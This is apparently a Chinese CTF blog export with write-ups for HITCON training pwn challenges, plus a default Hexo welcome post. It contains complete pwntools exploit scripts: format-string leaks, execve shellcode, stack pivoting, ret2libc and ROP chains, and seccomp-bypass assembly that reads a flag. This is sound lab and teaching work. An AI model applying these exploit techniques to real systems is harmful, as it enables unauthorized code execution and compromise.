[{"title":"HITCONING training 6-10 writeup","date":"2020-01-07T02:57:55.000Z","path":"2020/01/07/HITCONING-training-6-10-writeup/","text":"migrationemmm, 这题的做法跟前面的一道题差不多， 都可以泄露libc地址，进行栈迁移， 然后执行system函数来getshell， 差不多的思路就不重复写了 crack除了pie和改写重定位表以外的保护都开了 程序逻辑为从urandom文件中读取4个字节作为password， 由于urandom这个文件的内容是随机的， 所以password不可控， 但是后面有个格式化字符串漏洞，并且参数在栈上， 那么可以利用”%10$s” 泄露出password， 之后就可以cat flag了 1234567891011121314151617181920212223242526272829303132333435363738391 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./crack\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./crack\")2627 payload = p32(elf.symbols['password']) + \"%10$s\"28 p.sendlineafter(\"What your name ? \", payload)2930 p.recv(11)31 leak = u32(p.recv(4))32 log.info(\"leak -&gt; \" + hex(leak))3334 p.sendlineafter(\"Your password :\", str(leak))3536 p.interactive()3738 if __name__ == '__main__':39 pwn() cat flag:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"HITCON training 1-5 writeup ","date":"2020-01-05T08:29:00.000Z","path":"2020/01/05/HITCON-training-writeup/","text":"由于期末考的原因， 好久没写题了， 做hitcon training 的题目来熟悉熟悉 sysmagic查看保护可以看到程序没开pie与got， plt 表之类的可以改写 程序逻辑比较简单不啰嗦了， 经过观察buf的值不可控但是flag比较明显是for循环内输出的东西， 而putchar 内的数据代码中都有， 所以第一想法是写个C语言脚本直接输出 1234567891011121314151617 1 #include &lt;stdio.h&gt; 2 #include &lt;string.h&gt; 3 #include &lt;stdlib.h&gt; 4 5 int main(int argc, char **argv)&#123; 6 int d[] = &#123;2036297540, 1801418095, 1601662830, 1601792119, 1952414061, 7 1835884901, 1600484449, 1851880015, 1767859559, 8 1869832051, 1735287135, 1061124466, 63&#125;; 9 char s[] = &#123;7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89,10 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0,11 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91,12 49, 85, 2, 30, 33, 16, 76, 30, 66&#125;;13 for(int i = 0;i &lt;= 0x30;++i)&#123;14 putchar(*((char*)d + i) ^ s[i]);15 &#125;16 return 0;17 &#125; flag: 看到flag的瞬间毫无防备的留下了弱者的泪水， 能动态调试为什么要费时间写脚本呢… orw查看保护除了栈溢出保护其它保护全关了 程序逻辑简单， 要求输入shellcode来执行指令， 不过程序用了沙箱禁用了exceve系统调用， 不过没有禁用read, write, open等系统调用， 所以可以通过执行这三个系统调用直接把flag读出来关于沙箱这篇文章讲的比较详细：seccomp学习笔记通过执行seccomp-tools dump ./orw 可以查看可以执行哪些系统调用系统调用号查询:linux 系统调用号表 汇编代码(我用的是ATT格式)： 12345678910111213141516171819202122232425262728291 .section .text2 .globl _start3 4 _start:5 xor %eax, %eax6 movl $0x804A09b, %ebx7 movl $4, %ecx8 xor %edx, %edx9 movb $5, %al10 int $0x8011 12 movl %eax, %ebx13 pushl %esp14 movl %esp, %ecx15 movl $0x30, %edx16 xor %eax, %eax17 movb $3, %al18 int $0x8019 20 movl $1, %ebx21 pushl %esp22 popl %ecx23 movl $0x30, %edx24 xor %eax, %eax25 movb $4, %al26 int $0x8027 28 movl $1, %eax29 int $0x80 成功读取flag(由于没有靶机， 所以我在本地创建了一个flag文件) ret2sc保护全关 看到程序逻辑就是栈迁移执行shellcode具体步骤为将shellcode植入到bss段， 之后再将栈迁移到bss段中，然后就可以getshell了 1234567891011121314151617181920212223242526272829303132333435361 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 11213 def pwn():14 execve = \"./ret2sc\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2sc\")2627 shellcode = p32(elf.symbols['name'] + 4) + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"28 p.sendlineafter(\"Name:\", shellcode)2930 payload = 'a'*(0x14+8) + p32(elf.symbols['name'] - 4) + p32(0x804853c)31 p.sendlineafter(\"Try your best:\", payload)3233 p.interactive()3435 if __name__ == '__main__':36 pwn() 成功getshell ret2lib除了栈上数据不可执行以外的保护全关了 程序逻辑分析：程序中可以指定一个地址并且输出这个地址的内容， 随后的print_message函数中很明显存在栈溢出 那么思路就比较明了了， 先泄露libc地址， 随后计算出libc基址，之后利用栈溢出执行system， 最后getshell由于泄露地址后可以直接利用LibcSearcher 搜索出libc版本， 为了方便我直接用本机的libc版本 123456789101112131415161718192021222324252627282930313233343536373839404142434445461 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./ret2lib\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./ret2lib\")26 libc = ELF(\"/lib/i386-linux-gnu/libc-2.23.so\")2728 p.sendlineafter(\"Give me an address (in dec) :\", str(elf.got['puts']))29 leak = hex(int(p.recvline()[-9:-1], 16))30 log.info(\"leak -&gt; \" + leak)3132 libc_base = int(leak, 16) - libc.symbols['puts']33 log.info(\"libc_base -&gt; \" + hex(libc_base))3435 system = libc_base + libc.symbols['system']36 binsh = libc_base + libc.search('/bin/sh\\0').next()3738 pppr = 0x080486CD39 payload = 'a'*(0x38 + 4) + p32(system) + p32(0x12345678) + p32(binsh)4041 p.sendlineafter(\"Leave some message for me :\", payload)4243 p.interactive()4445 if __name__ == '__main__':46 pwn() 成功getshell simplerop除了NX其它全关 观察程序逻辑只有一个栈溢出， 而这个文件是个静态链接的文件，尝试找system的地址， 但是查找符号表没找到system但是open, write, read的地址都可以找到， 这意味着跟前面的题目思路一样， 利用rop调用这三个函数来读取flag 12345678910111213141516171819202122232425262728293031323334353637383940414243444546471 #!/usr/bin/python223 from pwn import *4 import sys5 import os67 #context(arch='amd64', os='linux', terminal=['tmux', 'splitw', '-h'])8 context(arch='i386', os='linux', terminal=['tmux', 'splitw', '-h'])9 context.log_level='debug'10 debug = 111 d = 01213 def pwn():14 execve = \"./simplerop\"15 if debug == 1:16 p = process(execve)17 if d == 1:18 gdb.attach(p)19 else:20 #ip = \"10.0.%s.140\" % sys.argv[1]21 ip = \"\"22 host = \"\"23 p = remote(ip, host)2425 elf = ELF(\"./simplerop\")2627 pppr = 0x080491D22829 payload = 'a'*(0x1c + 4) + p32(elf.symbols['read']) + p32(pppr)30 payload += p32(0) + p32(elf.bss() + 0x200) + p32(0x10) + p32(elf.symbols['main'])3132 p.sendafter(\"Your input :\", payload.ljust(100, '\\x00'))3334 p.sendline(\"flag\\0\")3536 raw_input()37 payload = 'a'*0x1838 payload += p32(elf.symbols['open']) + p32(pppr) + p32(elf.bss() + 0x200) + p32(4) + p32(0)39 payload += p32(elf.symbols['read']) + p32(pppr) + p32(3) + p32(elf.bss() + 0x200) + p32(0x10)40 payload += p32(elf.symbols['write']) + p32(pppr) + p32(1) + p32(elf.bss() + 0x200) + p32(0x10)4142 p.sendlineafter(\"Your input :\", payload)4344 p.interactive()4546 if __name__ == '__main__':47 pwn() 结果:","tags":[{"name":"PWN","slug":"PWN","permalink":"http://wafuter.jxustctf.top/tags/PWN/"}]},{"title":"Hello World","date":"2019-12-19T13:45:35.530Z","path":"2019/12/19/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","tags":[]}]